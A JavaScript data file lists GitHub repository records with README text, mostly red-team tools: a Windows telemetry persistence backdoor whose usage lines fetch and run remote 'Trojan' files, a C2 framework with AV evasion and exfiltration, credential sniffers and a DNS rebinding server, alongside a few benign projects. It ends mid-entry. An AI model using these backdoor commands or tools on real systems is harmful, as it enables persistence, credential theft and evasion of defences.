const documents = [{"tags": [], "owner": "360-Linton-Lab", "description": "WINDOWS TELEMETRY\u6743\u9650\u7ef4\u6301", "name": "Telemetry", "topics_string": "", "language": "C#", "readme": "\"# TELEMETRY\\n\\n\\n### Background\\n\\n[TELEMETRY](#TELEMETRY-1) is a C# For Windows PERSISTENCE\\n\\nToday we\\u2019re going to talk about a persistence method that takes advantage of some of the wonderful telemetry that Microsoft has included in Windows versions for the last decade. \\n\\n- **Local admin rights to install (requires the ability to write to HKLM)**\\n- **Have CompatTelRunner.exe**\\n- **2008R2/Windows 7 through 2019/Windows 10**\\n\\n### Advantage\\n\\n- **Using the system's own Telemetry planned tasks**\\n- **Only registry suspicious backdoor troubleshooting**\\n\\n### Command Line Usage\\n\\n ABUSING WINDOWS TELEMETRY FOR PERSISTENCE\\n .Imanfeng\\n Features:\\n Install: - Deployment authority maintains backdoor\\n \\n Command:\\n TELEMETRY.exe install /command:calc\\n - Execute command without file backdoor\\n \\n TELEMETRY.exe install /url:http://8.8.8.8/xxx.exe /path:C:\\\\Windows\\\\Temp\\\\check.exe\\n - Remotely download Trojan files to the specified directory for backdoor startup\\n \\n TELEMETRY.exe install /url:http://8.8.8.8/xxx.exe\\n - Remotely download Trojan files to C:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\compattelrun.exe for backdoor startup\\n \\n TELEMETRY.exe install /path:C:\\\\Windows\\\\Temp\\\\check.exe\\n - Set path Trojan files for backdoor startup\\n \\n Parameter:\\n /command: - Execute Command\\n /url: - Download FROM\\n /path: - Download To\\n\\n- Execute command without file backdoor\\n\\n ```\\n Telemetry.exe install /command:calc\\n ```\\n\\n ![1](PIC/2.png)\\n\\n \\n\\n- Remotely download Trojan files for backdoor startup\\n\\n ```\\n Telemetry.exe install /url:http://vps:8089/System.exe\\n ```\\n\\n ![2](PIC/1.png)\\n\\n \\n\\n### Learn\\n\\nhttps://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/\\n\"", "topics": ["redteam", "windows", "offensive"], "writeup": "", "ignoredescription": false, "id": 0, "full_name": "360-Linton-Lab/Telemetry", "url": "https://github.com/360-Linton-Lab/Telemetry", "topic_string": "redteam windows offensive"},
{"tags": [], "owner": "algolia", "description": ":globe_with_meridians: Turn any <input> into an address autocomplete", "name": "places", "topics_string": "", "language": "JavaScript", "readme": "\"[![header]][places-website]\\n\\n[![Version][version-svg]][package-url] [![Build Status][travis-svg]][travis-url] [![License][license-image]][license-url] [![Downloads][downloads-image]][downloads-url] [![jsDelivr Hits][jsdelivr-badge]][jsdelivr-url]\\n\\n[Algolia Places][places-website] provides a fast, distributed and easy way to use an address search autocomplete JavaScript library on your website.\\n\\nSee the [website][places-website] for more information.\\n\\nRead the [blog post](https://blog.algolia.com/introducing-algolia-places/) introducing Algolia Places.\\n\\nFill the [Google form](https://community.algolia.com/places/support.html#irrelevant-results) to report any irrelevant results.\\n\\n## Demo\\n\\nWatch [more examples on the website][places-website-examples].\\n\\n[![demo]][places-website]\\n\\n## Getting started\\n\\nTo use Algolia Places, all you need is an `<input>` and some JavaScript code that will load\\nand use the places.js library.\\n\\n### CDN `<script>`\\n\\nOur JavaScript library is available on the [jsDelivr CDN](http://www.jsdelivr.com) and also on [cdnjs](https://cdnjs.com/libraries/places.js).\\n\\n```html\\n<script src=\\\"https://cdn.jsdelivr.net/npm/places.js@1.19.0\\\"></script>\\n```\\n\\n[![Version][version-svg]][package-url] is the latest version.\\n\\nHere's a small example using it:\\n\\n```html\\n<input type=\\\"search\\\" id=\\\"address-input\\\" placeholder=\\\"Where are we going?\\\" />\\n\\n<script>\\n var placesAutocomplete = places({\\n appId: <YOUR_PLACES_APP_ID>,\\n apiKey: <YOUR_PLACES_API_KEY>,\\n container: document.querySelector('#address-input')\\n });\\n</script>\\n```\\n\\n### Using npm\\n\\nAlgolia Places is also available on [npm](https://www.npmjs.com/package/places.js).\\n\\nInstall the module:\\n\\n```sh\\nnpm install places.js --save\\n```\\n\\nPut an `<input>` in your html page:\\n\\n```html\\n<input type=\\\"search\\\" id=\\\"address-input\\\" placeholder=\\\"Where are we going?\\\" />\\n```\\n\\nInitialize the places.js library:\\n\\n```js\\nvar places = require('places.js');\\nvar placesAutocomplete = places({\\n appId: <YOUR_PLACES_APP_ID>,\\n apiKey: <YOUR_PLACES_API_KEY>,\\n container: document.querySelector('#address-input')\\n});\\n```\\n\\nFull documentation is available on the [Algolia Places website][places-website].\\n\\n## Contributing\\n\\nWanna contribute? Awesome, please read the [contributing guide][contributing].\\n\\n[demo]: ./demo.gif\\n[header]: ./header.png\\n[version-svg]: https://img.shields.io/npm/v/places.js.svg?style=flat-square\\n[package-url]: https://npmjs.org/package/places.js\\n[travis-svg]: https://img.shields.io/travis/algolia/places/master.svg?style=flat-square\\n[travis-url]: https://travis-ci.org/algolia/places\\n[license-image]: http://img.shields.io/badge/license-MIT-green.svg?style=flat-square\\n[license-url]: LICENSE\\n[downloads-image]: https://img.shields.io/npm/dm/places.js.svg?style=flat-square\\n[downloads-url]: http://npm-stat.com/charts.html?package=places.js\\n[places-website]: https://community.algolia.com/places/?utm_medium=social-owned&utm_source=GitHub&utm_campaign=places%20repository\\n[places-website-examples]: https://community.algolia.com/places/examples.html?utm_medium=social-owned&utm_source=GitHub&utm_campaign=places%20repository\\n[algolia-website]: https://www.algolia.com/?utm_medium=social-owned&utm_source=GitHub&utm_campaign=places%20repository\\n[places-docs]: https://community.algolia.com/places/documentation/?utm_medium=social-owned&utm_source=GitHub&utm_campaign=places%20repository\\n[contributing]: CONTRIBUTING.md\\n[jsdelivr-badge]: https://data.jsdelivr.com/v1/package/npm/places.js/badge\\n[jsdelivr-url]: https://www.jsdelivr.com/package/npm/places.js\\n\"", "topics": ["geocoder", "autocomplete", "geolocation", "geo"], "writeup": "", "ignoredescription": false, "id": 1, "full_name": "algolia/places", "url": "https://github.com/algolia/places", "topic_string": "geocoder autocomplete geolocation geo"},
{"tags": [], "owner": "alphasoc", "description": "A utility to generate malicious network traffic and evaluate controls", "name": "flightsim", "topics_string": "", "language": "Go", "readme": "\"# Network Flight Simulator\\n\\n**flightsim** is a lightweight utility used to generate malicious network traffic and help security teams to evaluate security controls and network visibility. The tool performs tests to simulate DNS tunneling, DGA traffic, requests to known active C2 destinations, and other suspicious traffic patterns.\\n\\n## Installation\\n\\nDownload the latest flightsim binary for your OS from the [GitHub Releases](https://github.com/alphasoc/flightsim/releases) page. Alternatively, the utility can be built using [Golang](https://golang.org/doc/install) in any environment (e.g. Linux, MacOS, Windows), as follows:\\n\\n```\\ngo get -u github.com/alphasoc/flightsim/...\\n```\\n\\n## Running Network Flight Simulator\\n\\nUpon installation, test flightsim as follows:\\n\\n```\\n$ flightsim --help\\n\\nAlphaSOC Network Flight Simulator\\u2122 (https://github.com/alphasoc/flightsim)\\n\\nflightsim is an application which generates malicious network traffic for security\\nteams to evaluate security controls (e.g. firewalls) and ensure that monitoring tools\\nare able to detect malicious traffic.\\n\\nUsage:\\n flightsim <command> [arguments]\\n\\nAvailable Commands:\\n run Run all modules, or a particular module\\n version Prints the version number\\n\\nCheatsheet:\\n flightsim run Run all the modules\\n flightsim run c2 Simulate C2 traffic\\n flightsim run c2:trickbot Simulate C2 traffic for the TrickBot family\\n```\\n\\nThe utility runs individual modules to generate malicious traffic. To perform all available tests, simply use `flightsim run` which will generate traffic using the first available non-loopback network interface. **Note:** when running many modules, flightsim will gather destination addresses from the AlphaSOC API, so requires egress Internet access.\\n\\nTo list the available modules, use `flightsim run --help`. To execute a particular test, use `flightsim run <module>`, as below.\\n\\n```\\n$ flightsim run --help\\nusage: flightsim run [flags] [modules]\\n\\nTo run all available simulators, call:\\n\\n flightsim run\\n\\n To run a specific module:\\n\\n flightsim run c2\\n\\nAvailable modules:\\n\\n\\tc2, dga, miner, scan, sink, spambot, tunnel-dns, tunnel-icmp\\n\\nAvailable flags:\\n -dry\\n \\tprint actions without performing any network activity\\n -fast\\n \\treduce sleep intervals between simulation events\\n -iface string\\n \\tnetwork interface or local IP address to use\\n -size int\\n \\tnumber of hosts generated for each simulator\\n\\n$ flightsim run dga\\n\\nAlphaSOC Network Flight Simulator\\u2122 (https://github.com/alphasoc/flightsim)\\nThe IP address of the network interface is 172.20.10.2\\nThe current time is 23-Jan-20 11:33:21\\n\\n11:33:21 [dga] Generating a list of DGA domains\\n11:33:21 [dga] Resolving nurqatp.space\\n11:33:22 [dga] Resolving uahscqe.top\\n11:33:23 [dga] Resolving asimazf.biz\\n11:33:24 [dga] Resolving phxeohj.biz\\n11:33:25 [dga] Resolving crgwsoe.biz\\n11:33:26 [dga] Resolving sazafls.biz\\n11:33:27 [dga] Resolving gljyxdv.space\\n11:33:28 [dga] Resolving eiontgl.top\\n11:33:29 [dga] Resolving pqjseqc.top\\n11:33:30 [dga] Resolving mamsnmu.biz\\n11:33:31 [dga] Resolving ntettqn.top\\n11:33:32 [dga] Resolving niyvbvg.top\\n11:33:33 [dga] Resolving bxgqonb.biz\\n11:33:34 [dga] Resolving encggla.top\\n11:33:35 [dga] Resolving qphfoxn.biz\\n11:33:35 [dga] Done (15/15)\\n\\nAll done! Check your SIEM for alerts using the timestamps and details above.\\n```\\n\\n## Description of Modules\\n\\nThe modules packaged with the utility are listed in the table below.\\n\\n| Module | Description |\\n| ------------- | ----------------------------------------------------------------------------- |\\n| `c2` | Generates both DNS and IP traffic to a random list of known C2 destinations |\\n| `dga` | Simulates DGA traffic using random labels and top-level domains |\\n| `miner` | Generates Stratum mining protocol traffic to known cryptomining pools |\\n| `scan` | Performs a port scan of random RFC 5737 addresses using common TCP ports |\\n| `sink` | Connects to known sinkholed destinations run by security researchers |\\n| `spambot` | Resolves and connects to random Internet SMTP servers to simulate a spam bot |\\n| `tunnel-dns` | Generates DNS tunneling requests to \\\\*.sandbox.alphasoc.xyz |\\n| `tunnel-icmp` | Generates ICMP tunneling traffic to an Internet service operated by AlphaSOC |\\n\"", "topics": ["intrusion-detection", "traffic-generator", "monitoring", "generation", "security", "testing-tools"], "writeup": "flightsim is a lightweight utility used to generate malicious network traffic and help security teams to evaluate security controls and network visibility. The tool performs tests to simulate DNS tunneling, DGA traffic, requests to known active C2 destinations, and other suspicious traffic patterns.", "ignoredescription": false, "id": 2, "full_name": "alphasoc/flightsim", "url": "https://github.com/alphasoc/flightsim", "topic_string": "intrusion-detection traffic-generator monitoring generation security testing-tools"},
{"tags": [], "owner": "ashemery", "description": "Offensive Software Exploitation Course", "name": "exploitation-course", "topics_string": "", "language": "Python", "readme": "\"# Offensive Software Exploitation (OSE) Course\\n\\nThis repository is for the Offensive Software Exploitation Course I am teaching at Champlain College and currently doing it for free online (check the YouTube channel for the recordings). Most of the slidenotes I used, are already shared on [HTID Course](http://opensecuritytraining.info/HTID.html), but the labs were fully created by myself. I used publically available resources and software to explain each of the weakneses covered, so there is nothing here that you cannot find online.\\n\\n---\\n### Vulnerable Software\\nThe vulnerable software I used are also online and can be found at [Exploit-db](https://www.exploit-db.com/). I also used Stephen Bradshaw's [VulnServer](https://github.com/stephenbradshaw/vulnserver), plus maybe some other simple code that I prepared. Please check each lab for the software used in that specific lab and from where to download it.\\n\\n---\\n### Tool(s) Required\\nAll of the tools used are free and could be downloaded from the URLs below.\\n- Immunity Debugger: [download](https://www.immunityinc.com/products/debugger/)\\n- Kali Linux: [download](https://www.kali.org/)\\n- CFF Explorer: [download](https://ntcore.com/?page_id=388)\\n- NetCat: [download](https://joncraton.org/blog/46/netcat-for-windows/)\\n- Others!\\n\\n---\\n### Target(s) Used\\n- Download a Windows 10 VM from Microsoft VMs (currently using Version 1809 Build 17763.1339) [here](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/). This will be used for most of the labs, except for the EggHunter lab, I used a Windows 7 VM, also from Microsoft VMs (currently offline so check archive.org).\\n- All the targeted software is Intel/AMD 32-bit unless otherwise instructed.\\n\\n---\\n### Table of Contents:\\nThe topics that will be covered in this course are:\\n1. The Basics (PE Format, DLLs, etc)\\n2. Bug Hunting and Fuzzing\\n3. Intro. to Memory Corruption and Buffer Overflows\\n4. Metasploit\\n5. Mitigation Techniques\\n6. SEH and Jumping Strategies\\n7. Egghunter\\n8. Retrurn Oriented Programming (ROP)\\n9. Post Exploitation\\n10. Manual Code Injection\\n\\n---\\n### Video Recordings:\\n- Arabic version: [Playlist](https://www.youtube.com/playlist?list=PLCS2zI95IiNyo5AhbVIL2hVX7zhuSkOkz)\\n- English version: [Playlist](https://www.youtube.com/playlist?list=PLCS2zI95IiNybAAQ0HL88YzwRpLXje5y6)\\n\\n---\\n### Useful Resources:\\n- The number one resource is the Corelan Team's blog, [Corelan Team](https://www.corelan.be/)\\n\\n---\\n### Update(s):\\n- On Aug. 6th, 2020 both [eLearnSecurity](https://www.elearnsecurity.com/) and [INE](https://www.ine.com/) decided to sponsor the English version of the course and therefore will be recording an English version too.\\n\\n### Credits:\\nThanks to everyone who shared their work online, without them this course would not have happened!\\n\\n\\n\"", "topics": ["exploitation", "exploit", "ose", "offensive"], "writeup": "", "ignoredescription": false, "id": 3, "full_name": "ashemery/exploitation-course", "url": "https://github.com/ashemery/exploitation-course", "topic_string": "exploitation exploit ose offensive"},
{"tags": [], "owner": "atredispartners", "description": "Flamingo captures credentials sprayed across the network by various IT and security products.", "name": "flamingo", "topics_string": "", "language": "Go", "readme": "\"# Flamingo \\n\\nA filter-feeding bird. Captures credentials sprayed across the network by various IT and security products.\\n\\nCurrently supports SSH, HTTP, LDAP, DNS, FTP, and SNMP credential collection.\\n\\nPull requests are encouraged for additional protocols and output destinations.\\n\\n## Usage\\n\\n1. Obtain the flamingo binary from the [releases](https://github.com/atredispartners/flamingo/releases) page or build from source.\\n\\n```\\n$ GOOS=win32 GOARCH=amd64 go build -o flamingo.exe\\n```\\n\\n```\\n$ go get -u -v github.com/atredispartners/flamingo && \\\\\\n go install -v github.com/atredispartners/flamingo && \\\\\\n $GOPATH/bin/flamingo\\n```\\n\\n2. Run the binary and collect credentials\\n```\\nC:\\\\> flamingo.exe\\n\\n{\\\"_etime\\\":\\\"2020-01-10T17:56:51Z\\\",\\\"_host\\\":\\\"1.2.3.4:18301\\\",\\\"_proto\\\":\\\"ssh\\\",\\\"method\\\":\\\"pubkey\\\",\\\"pubkey\\\":\\\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPVSxqrWfNle0nnJrKS3NA12uhu9PHxnP4OlD843tRz/\\\",\\\"pubkey-sha256\\\":\\\"SHA256:/7UkXjk0XtBe9N6RrAGGgJTGuKKi1Hgk3E+4TPo54Cw\\\",\\\"username\\\":\\\"devuser\\\",\\\"version\\\":\\\"SSH-2.0-OpenSSH_for_Windows_7.7\\\"}\\n\\n{\\\"_etime\\\":\\\"2020-01-10T17:56:52Z\\\",\\\"_host\\\":\\\"1.2.3.4:1361\\\",\\\"_proto\\\":\\\"ssh\\\",\\\"method\\\":\\\"password\\\",\\\"password\\\":\\\"SuperS3kr3t^!\\\",\\\"username\\\":\\\"root\\\",\\\"version\\\":\\\"SSH-2.0-OpenSSH_for_Windows_7.7\\\"}\\n\\n{\\\"_etime\\\":\\\"2020-01-10T17:56:53Z\\\",\\\"_host\\\":\\\"1.2.3.4:9992\\\",\\\"_proto\\\":\\\"ssh\\\",\\\"method\\\":\\\"password\\\",\\\"password\\\":\\\"DefaultPotato\\\",\\\"username\\\":\\\"vulnscan-a\\\",\\\"version\\\":\\\"SSH-2.0-OpenSSH_for_Windows_7.7\\\"}\\n\\n```\\n\\nThe default is to log credentials to standard output and append to `flamingo.log` in the working directory.\\n\\n## Options\\n\\nUse `--protocols` to configure a list of enabled protocol listeners\\n\\nUse additional options to specify ports and protocol options for listeners.\\n\\nAll additional command-line arguments are output destinations.\\n\\n## Outputs\\n\\nFlamingo can write recorded credentials to a variety of output formats. By default, flamingo will log to `flamingo.log` and standard output.\\n\\n### Standard Output\\n\\nSpecifying `-` or `stdout` will result in flamingo only logging to standard output.\\n\\n### File Destinations\\n\\nSpecifying one or more file paths will result in flamingo appending to these files.\\n\\n### HTTP Destinations\\n\\nSpecifying HTTP or HTTPS URLs will result in flamingo sending a webhook POST request to each endpoint.\\n\\nBy default, this format supports platforms like Slack and Mattermost that support inbound webhooks.\\n\\nThe actual HTTP POST looks like:\\n\\n```\\nPOST /specified-url\\nContent-Type: application/json\\nUser-Agent: flamingo/v0.0.0\\n\\n{\\\"text\\\": \\\"full-json-output of credential report\\\"}\\n```\\n\\n### Syslog Destinations\\n\\nSpecifying `syslog` or `syslog:<parameters>` will result in flamingo sending credentials to a syslog server.\\n\\nThe following formats are supported:\\n\\n * syslog - send to the default syslog output, typically a unix socket\\n * syslog:unix:/dev/log - send to a specific unix stream socket\\n * syslog:host - send to the specified host using udp and port 514\\n * syslog:host:port - send to the specified host using udp and the specified port\\n * syslog:udp:host - send to the specified host using udp and port 514\\n * syslog:udp:host:port - send to the specified host using udp and the specified port\\n * syslog:tcp:host - send to the specified host using tcp and port 514\\n * syslog:tcp:host:port - send to the specified host using tcp and the specified port\\n * syslog:tcp+tls:host - send to the specified host using tls over tcp and port 514\\n * syslog:tcp+tls:host:port - send to the specified host using tls over tcp and the specified port\\n\\n## Credits\\n\\n * Flamingo is developed and maintained by [HD Moore](https://github.com/hdm) and [Tom Steele](https://github.com/tomsteele)\\n * Initial requirements by [Chris Bellows](https://github.com/chris-atredis)\\n * NTLM support for HTTP by [Alex Flores](https://github.com/audibleblink)\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 4, "full_name": "atredispartners/flamingo", "url": "https://github.com/atredispartners/flamingo", "topic_string": ""},
{"tags": [], "owner": "bats3c", "description": "A post exploitation framework designed to operate covertly on heavily monitored environments", "name": "shad0w", "topics_string": "", "language": "C", "readme": "\"[![Project Status](https://img.shields.io/badge/status-BETA-yellow?style=flat-square)]()\\n\\n# SHAD0W\\n\\n<p align=\\\"center\\\">\\n <img alt=\\\"shad0w logo\\\" src=\\\"shad0w.png\\\" />\\n</p>\\n\\nSHAD0W is a modular C2 framework designed to successfully operate on mature environments.\\n\\nIt will use a range of methods to evade EDR and AV while allowing the operator to continue using tooling an tradecraft they are familiar with. Its powered by Python 3.8 and C, using [Donut](https://github.com/TheWover/donut) for payload generation. By using Donut along side the process injection capabilities of SHAD0W it gives the operator the ability to execute .NET assemblies, EXEs, DLLs, VBS, JS or XSLs fully inside memory. Dynamically resolved syscalls are heavily used to avoid userland API hooking, anti DLL injection to make it harder for EDR to load code into the beacons and offical microsoft mitigation methods to protect spawn processes.\\n\\nMain features of the SHAD0W C2 are:\\n\\n- **Built For Docker** - It runs fully inside docker allowing cross platform usage\\n- **Live Proxy & Mirror** - The C2 server is able to mirror any website in real time, relaying all non C2 traffic to that site making it look less subject when viewed in a web browser\\n- **HTTPS C2 Communication** - All traffic between beacons and the C2 will be encrypted and transmitted over HTTPS\\n- **Modern CLI** - The CLI is built on [prompt-toolkit](https://github.com/prompt-toolkit/python-prompt-toolkit)\\n- **JSON Based Protocol** - Custom beaons are able to built and used easily with an easy to implement protocol\\n- **Extremely Modular** - Easy to create new modules to interact and task beacons\\n\\nMain features of SHAD0W beacons are:\\n\\n- **Shellcode, EXE, Powershell & More** - Beacons can be generated and used in many different formats\\n- **Process Injection** - Allowing you to `migrate`, `shinject`, `dllinject` and more\\n- **Bypass AV** - Payloads are frequently updated to evade common Anti-Virus products\\n- **Highly configurable** - Custom jitters, user agents and more\\n- **Proxy Aware** - All callbacks will use the current system proxy\\n- **HTTPS C2 Communication** - Traffic to and from the C2 is encrypted via HTTPS\\n\\nCurrent Modules:\\n\\n- **GhostPack** - With the binarys compiled nightly via an Azure pipeline. Thanks to [@Flangvik](https://twitter.com/Flangvik)\\n- **Unmanaged Powershell** - With built in AMSI bypass\\n- **Ghost In The Logs** - Disable ETW & Sysmon, more info can be found [here](https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/)\\n- **Elevate** - Built in PrivEsc exploits\\n- **SharpSocks** - Reverse socks proxy over HTTPS\\n- **SharpCollection** - A ton of .NET offensive tools, more info can be found [here](https://github.com/Flangvik/SharpCollection)\\n- **Mimikatz** - For all your credential theft needs\\n- **Upload & Download** - Easy data exfiltration\\n- **StdAPI** - Common commands to interact with the file system\\n\\n## Install\\n\\n $ git clone --recurse-submodules https://github.com/bats3c/shad0w.git && cd shad0w\\n $ sudo ./shad0w install\\n\\n## Usage\\n\\nhttps://labs.jumpsec.com/2020/06/03/shad0w/\\n\\n## Official Discord\\n\\n[![Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/widget.png?style=banner3)](https://discord.gg/ycXRvcD)\"", "topics": ["c2", "redteam", "dotnet", "shellcode", "docker"], "writeup": "SHAD0W is a modular C2 framework designed to successfully operate on mature environments. Supports JSON Based Protocol - Custom beaons are able to built and used easily with an easy to implement protocol It will use a range of methods to evade EDR and AV while allowing the operator to continue using tooling an tradecraft they are familiar with. Its powered by Python 3.8 and C, using Donut for payload generation. By using Donut along side the process injection capabilities of SHAD0W it gives the operator the ability to execute .NET assemblies, EXEs, DLLs, VBS, JS or XSLs fully inside memory. Dynamically resolved syscalls are heavily used to avoid userland API hooking, anti DLL injection to make it harder for EDR to load code into the beacons and offical microsoft mitigation methods to protect spawn processes.\n", "ignoredescription": false, "id": 5, "full_name": "bats3c/shad0w", "url": "https://github.com/bats3c/shad0w", "topic_string": "c2 redteam dotnet shellcode docker"},
{"tags": [], "owner": "bbc", "description": "Wraith \u2014 A responsive screenshot comparison tool", "name": "wraith", "topics_string": "", "language": "Ruby", "readme": "\"![Wraith logo](https://raw.githubusercontent.com/BBC-News/wraith/master/assets/wraith-logo.png)\\n\\n[![build status](https://secure.travis-ci.org/BBC-News/wraith.png?branch=master)](http://travis-ci.org/BBC-News/wraith)\\n[![rubygems version](https://img.shields.io/gem/v/wraith.svg)](https://rubygems.org/gems/wraith)\\n[![codeclimate report](https://codeclimate.com/github/BBC-News/wraith.png)](https://codeclimate.com/github/BBC-News/wraith)\\n\\nWraith is a screenshot comparison tool, created by developers at BBC News.\\n\\n[Documentation](http://bbc-news.github.io/wraith/) \\u2022 [Source](http://github.com/bbc-news/wraith) \\u2022 [Responsive News Website](http://responsivenews.co.uk)\\n\\n## What is it?\\n\\nWraith uses a headless browser to create screenshots of webpages on different environments (or at different moments in time) and then creates a diff of the two images; the affected areas are highlighted in blue.\\n\\n![Photo of BBC News with a diff](http://bbc-news.github.io/wraith/img/wraith.png)\\n\\n## Documentation\\n\\nFor instructions on how to install, set up and use Wraith and all of its features, [visit the Wraith documentation](http://bbc-news.github.io/wraith/index.html).\\n\\nA brief overview of how Wraith works is provided below.\\n\\n## Wraith modes\\n\\nThere are several ways in which Wraith can be used:\\n\\n1. Comparison of 2 domains (`wraith capture`). There are also some specialist options within this mode:\\n * Spidering 2 domains for changes (`wraith capture` when no `paths` property is provided in the configuration file)\\n * Running several comparisons at once (`wraith multi_capture`)\\n2. Comparing the same domain over time (`wraith history`, then `wraith latest`)\\n\\nWhichever mode you decide to run Wraith in, the process it follows is generally the same:\\n\\n* takes screenshots of your webpages\\n* runs a comparison task across them\\n* outputs a diff PNG file comparing the two images, and a data.txt file which contains the percentage of pixels that have changed\\n* packages all of this up into a gallery.html, ready for you to view\\n* if any screenshot's diff is above the threshold you specified in your configuration file, the task exits with a system error code (useful for CI)\\n* the failed screenshot will also be highlighted in the gallery\\n\\n## Requirements\\n\\n[ImageMagick](http://www.imagemagick.org/) is required to compare the screenshots and crop images.\\n\\nWraith also requires at least one of these headless browsers:\\n\\n* [PhantomJS](http://phantomjs.org)\\n* [CasperJS](http://casperjs.org/) (which can be used to target specific selectors)\\n* [SlimerJS](http://slimerjs.org)\\n* [Chrome](https://askubuntu.com/questions/510056/how-to-install-google-chrome/510063) (Currently using Selenium WebDriver + Chromedriver for Chrome; Can target specific selectors)\\n\\n## Contributing\\n\\nPlease read [how to contribute to Wraith](https://github.com/BBC-News/wraith/blob/master/.github/CONTRIBUTING.md).\\n\\n## License\\n\\nWraith is available to everyone under the terms of the Apache 2.0 open source license. [Take a look at Wraith's LICENSE file](https://github.com/BBC-News/wraith/blob/master/LICENSE).\\n\\n## Credits\\n\\n * [Dave Blooman](https://twitter.com/dblooman)\\n * [John Cleveley](https://twitter.com/jcleveley)\\n * [Simon Thulbourn](https://twitter.com/sthulb)\\n * [Chris Ashton](https://twitter.com/chrisbashton)\\n\\n## Selenium-Wraith\\n\\nAnyone interested in integrating selenium capability with Wraith should check out [Selenium-Wraith](https://github.com/mathew-hall/wraith-selenium) (maintained by Mathew Hall), which was forked from BBC's Wraith on 16/04/14 and adds the following capabilities:\\n\\n1. Selenium integration, both running locally on a desktop or on a selenium grid\\n2. Browser to browser screenshot comparison\\n3. Page component-based comparison\\n\"", "topics": [], "writeup": "Wraith uses a headless browser to create screenshots of webpages on different environments (or at different moments in time) and then creates a diff of the two images; the affected areas are highlighted in blue.", "ignoredescription": false, "id": 6, "full_name": "bbc/wraith", "url": "https://github.com/bbc/wraith", "topic_string": ""},
{"tags": [], "owner": "blendin", "description": "Tool for extracting information from newly spawned processes", "name": "3snake", "topics_string": "", "language": "C", "readme": "\"3snake - dump sshd and sudo credential related strings\\n---\\n\\nAbout\\n---\\nTargeting rooted servers, reads memory from `sshd` and `sudo` system calls that handle password based authentication. Doesn't write any memory to the traced processes. Spawns a new process for every `sshd` and `sudo` command that is run.\\n\\nListens for the `proc` event using netlink sockets to get candidate processes to trace. When it receives an `sshd` or `sudo` process `ptrace` is attached and traces `read` and `write` system calls, extracting strings related to password based authentication.\\n\\nDon't really like the solution of backdooring openssh or installing a kernel module on target servers so I made this.\\n\\n![3snake](https://user-images.githubusercontent.com/20363764/35941544-74b2d22c-0c07-11e8-887a-474cb9b6daec.gif)\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nBuild\\n---\\n```sh\\nmake\\n./3snake -h\\n./3snake\\n```\\n\\n\\n\\n\\n\\nUsage\\n---\\n\\nRun in current terminal\\n`./3snake`\\n\\nDaemonize and dump output to file\\n`./3snake -d -o \\\"/tmp/output_file.txt\\\"`\\n\\nConfiguration\\n---\\nLocated in [config.h](https://github.com/blendin/3snake/blob/master/src/config.h) \\n- __ROOT_DIR__ - root directory when daemonized (relative file paths for -o option will end up here) \\n- __ENABLE_SSH__ - OpenSSH server password auth\\n- __ENABLE_SUDO__ - sudo password auth\\n- __ENABLE_SU__ (experimental) - su password auth\\n- __ENABLE_SSH_CLIENT__ (experimental) - ssh client password auth\\n\\nLimitations\\n---\\nLinux, ptrace enabled, /proc filesystem mounted\\n\\n\\nTodo\\n---\\n\\n| Features | X |\\n|---------------------------------------------------|-----|\\n| OpenSSH server password auth | X |\\n| sudo | X |\\n| su | X |\\n| regex strings from processes | ~ |\\n| ssh client | X |\\n\\n* Make the process of adding tracers more fluid\\n* Yubikey: Ask for second yubikey from end users, OpenSSH\\n* Output mode that only shows usernames/passwords\\n\\nLicense\\n---\\nMIT\\n\"", "topics": ["redteam", "credentials", "linux", "sshd"], "writeup": "Targeting rooted servers, reads memory from sshd and sudo system calls that handle password based authentication. Doesn't write any memory to the traced processes. Spawns a new process for every sshd and sudo command that is run. Listens for the proc event using netlink sockets to get candidate processes to trace. When it receives an sshd or sudo process ptrace is attached and traces read and write system calls, extracting strings related to password based authentication. Don't really like the solution of backdooring openssh or installing a kernel module on target servers so I made this.\n", "ignoredescription": false, "id": 7, "full_name": "blendin/3snake", "url": "https://github.com/blendin/3snake", "topic_string": "redteam credentials linux sshd"},
{"tags": [], "owner": "brannondorsey", "description": "A \"malicious\" DNS server for executing DNS Rebinding attacks on the fly (public instance running on rebind.network:53)", "name": "whonow", "topics_string": "", "language": "JavaScript", "readme": "\"# Whonow DNS Server\\n\\nA malicious DNS server for executing [DNS Rebinding attacks](https://en.wikipedia.org/wiki/DNS_rebinding) on the fly. `whonow` lets you specify DNS responses and rebind rules dynamically *using domain requests themselves*.\\n\\n```bash\\n# respond to DNS queries for this domain with 34.192.228.43 the first time\\n# it is requested and then 192.168.1.1 every time after that\\nA.34.192.228.43.1time.192.168.1.1.forever.rebind.network\\n\\n# respond first with 34.192.228.43, then 192.168.1.1 the next five times,\\n# and then start all over again (1, then 5, forever...)\\nA.34.192.228.43.1time.192.168.1.1.5times.repeat.rebind.network\\n```\\n\\nWhat's great about dynamic DNS Rebinding rules is that you don't have to spin up your own malicious DNS server to start exploiting the browser's [Same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy). Instead, everyone can share the same public `whonow` server running on port 53 of `rebind.network`.\\n\\n**Note**: You should include UUIDs (e.g. `a06a5856-1fff-4415-9aa2-823230b05826\\n`) as a subdomain in each DNS lookup to a `whonow` server. These have been omitted from examples in this README for brevity, but assume requests to `*.rebind.network` should be `*.a06a5856-1fff-4415-9aa2-823230b05826.rebind.network`. See the [Gotchas](#gotchas) section for more info as to why.\\n\\n**DISCLAIMER: This software is for educational purposes only. This software should not be used for illegal activity. The author is not responsible for its use. Don't be a dick.**\\n\\n## Subdomains = Rebind Rules\\n\\nThe beauty of `whonow` is that you can define the behavior of DNS responses via subdomains in the domain name itself. Using only a few simple keywords: `A`, `(n)times`, `forever`, and `repeat`, you can define complex and powerful DNS behavior.\\n\\n### Anatomy of a `whonow` request\\n\\n```\\nA.<ip-address>.<rule>[.<ip-address>.<rule>[.<ip-address>.<rule>]][.uuid/random-string].example.com\\n```\\n\\n- `A`: The type of DNS request. Currently only `A` records are supported, but `AAAA` should be coming soon.\\n- `<ip-address>`: an ipv4 (ipv6 coming soon) address with each octet seprated by a period (e.g. `192.168.1.1`.\\n- `<rule>`: One of three rules\\n\\t- `(n)time[s]`: The number of times the DNS server should reply with the previous IP address. Accepts both 